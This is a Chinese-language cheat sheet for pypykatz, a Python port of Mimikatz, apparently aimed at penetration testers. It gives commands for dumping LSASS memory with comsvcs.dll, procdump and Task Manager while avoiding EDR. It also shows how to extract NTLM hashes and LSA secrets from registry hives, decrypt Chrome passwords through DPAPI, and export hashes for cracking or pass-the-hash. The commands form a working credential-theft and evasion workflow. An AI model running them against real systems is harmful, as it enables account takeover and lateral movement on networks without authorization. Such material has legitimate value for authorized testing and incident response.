<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# pypykatz 备忘单

[pypykatz](https://github.com/skelsec/pypykatz) 是 [Mimikatz](https://github.com/gentilkiwi/mimikatz) 的纯 Python 实现。它使渗透测试人员和事件响应人员能够在 Linux 和 macOS 上完全离线地解析 Windows LSASS 内存转储、SAM/SYSTEM/SECURITY 注册表配置单元、DPAPI 密钥和 Kerberos 票证，而无需触发 Windows Defender、端点检测和响应 (EDR) 代理，也不需要实时 Windows 主机访问。

---

## 目录

- [概述和操作安全 (OpSec)](#overview--operational-security-opsec)
- [安装](#安装)
- [离线LSASS转储解析(`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [SAM 和系统配置单元提取 (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [LSA 秘密提取 (`registry security`)](#lsa-secrets-extraction-registry-security)
- [DPAPI 主密钥和凭证解析](#dpapi-master-keys--credential-parsing)
- [JSON 导出和自动凭证管道](#json-export--automated-credential-pipelines)
- [在 Windows 上安全转储 LSASS 的技术](#techniques-to-safely-dump-lsass-on-windows)

---

## 概述和操作安全 (OpSec)

在目标 Windows 计算机上运行标准 `mimikatz.exe` 经常会触发行为传感器和静态签名。 `pypykatz` 将转储阶段与解析阶段分开：
1. 使用本机或 LOLBAS 工具（任务管理器、`procdump`、`rundll32.exe` 或 `comsvcs.dll`）转储 LSASS 进程内存。
2. 将 `.dmp` 文件提取到您的 Linux 分析系统。
3. 使用 `pypykatz` 完全离线解析凭证，AV 风险为零。

 - -

＃＃ 安装
```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```
---

## 离线LSASS转储解析（`lsa minidump`）

解析从 `lsass.exe` 生成的内存转储以检索明文密码、NTLM 哈希值、SHA1 哈希值、Kerberos 票证 (TGT/TGS) 和 AES 加密密钥：

### 1. 基本小型转储解析
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
输出提取按安全提供程序分区的凭据：
- **msv1_0：** 用户名、域、NTLM 哈希和 LM 哈希。
- **wdigest：** 明文密码（如果启用了 WDigest 缓存）。
- **kerberos：** Kerberos 票证会话和 AES 密钥。
- **ssp：** 安全支持提供商凭据。
- **livessp:** Microsoft 帐户凭据。
- **cloudap：** Azure AD 主刷新令牌 (PRT) 和会话密钥。

### 2. 递归地解析多个内存转储
```bash
pypykatz lsa minidump /loot/dumps/ -r
```
---

## SAM 和系统蜂巢提取 (`registry sam`)

从脱机 Windows 注册表配置单元副本中提取本地帐户用户名、RID 和 NTLM 密码哈希值：
```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
输出：
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```
---

## LSA 秘密提取 (`registry security`)

从 `SECURITY` 和 `SYSTEM` 配置单元恢复 LSA 机密、计算机帐户密码、默认域密码和服务帐户明文密钥：
```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
提取的秘密包括：
- `_SC_DefaultPassword`：自动登录凭据。
- `$MACHINE.ACC`：域计算机帐户 NTLM 哈希值。
- 缓存域凭据（DCC2 / mscache2）。

---

## DPAPI 主密钥和凭证解析

数据保护 API (DPAPI) 对 Chrome 密码、Wi-Fi 密钥和 RDP 凭据进行加密：

### 1. 从注册表和系统中提取 DPAPI 主密钥
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```
### 2. 解密 Chrome 存储的密码
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```
---

## JSON 导出和自动凭证管道

将解析后的凭据直接导出到 JSON，以便立即摄取到 Hashcat、BloodHound 或 CrackMapExec 中：
```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```
使用 `jq` 提取干净的 NTLM 哈希值以进行立即哈希破解或传递哈希值：
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```
---

## 在 Windows 上安全转储 LSASS 的技术

要将内存送入 `pypykatz`，请使用本机组件在目标主机上创建 LSASS 小型转储：

### 1. 通过 `comsvcs.dll` 的本机 LOLBAS（管理员 PowerShell）
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```
### 2. 任务管理器 GUI
1. 以管理员身份打开任务管理器。
2. 在**详细信息**下，右键单击 `lsass.exe`。
3. 单击**创建转储文件**（保存到`%TEMP%\lsass.DMP`）。

### 3.系统内部`procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*下载到您的 Linux 计算机后，执行 `pypykatz lsa minidump lsass.dmp`。*